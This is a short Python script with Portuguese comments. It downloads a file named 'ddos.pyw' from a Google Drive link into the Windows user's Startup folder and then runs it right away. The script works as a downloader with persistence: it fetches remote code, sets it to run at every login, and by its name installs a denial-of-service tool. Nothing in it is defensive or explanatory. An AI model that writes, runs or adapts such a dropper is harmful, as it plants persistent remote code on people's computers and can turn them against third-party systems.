import os
import subprocess
import urllib.request

# ----------------------------
# Caminhos do usuário e Startup
# ----------------------------
usuario = os.environ.get("USERNAME")
pasta_startup = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
arquivo = "ddos.pyw"
caminho_destino = os.path.join(pasta_startup, arquivo)

# Pasta onde o Python portátil foi descompactado
pasta_python = os.path.join("C:\\Users", usuario, "PythonPortable")
python_exe = os.path.join(pasta_python, "python.exe")

# ----------------------------
# Cria a pasta Startup caso não exista
# ----------------------------
if not os.path.exists(pasta_startup):
    os.makedirs(pasta_startup)

# ----------------------------
# Baixa o script para a pasta Startup
# ----------------------------
url_arquivo = "https://drive.google.com/uc?export=download&id=1jCyLEuXUtWAzCnAIDKA2JPaq5N4nSQu3"
try:
    urllib.request.urlretrieve(url_arquivo, caminho_destino)
    print(f"Arquivo baixado com sucesso para: {caminho_destino}")
except Exception as e:
    print(f"Erro ao baixar o arquivo: {e}")
    exit()

# ----------------------------
# Executa o script usando Python portátil se existir
# ----------------------------
if os.path.exists(python_exe):
    python_para_uso = python_exe
    print(f"Usando Python portátil: {python_exe}")
else:
    python_para_uso = "python"  # fallback se estiver no PATH
    print("Usando Python do sistema (PATH)")

try:
    subprocess.run([python_para_uso, caminho_destino], check=True)
except Exception as e:
    print(f"Erro ao executar o arquivo: {e}")
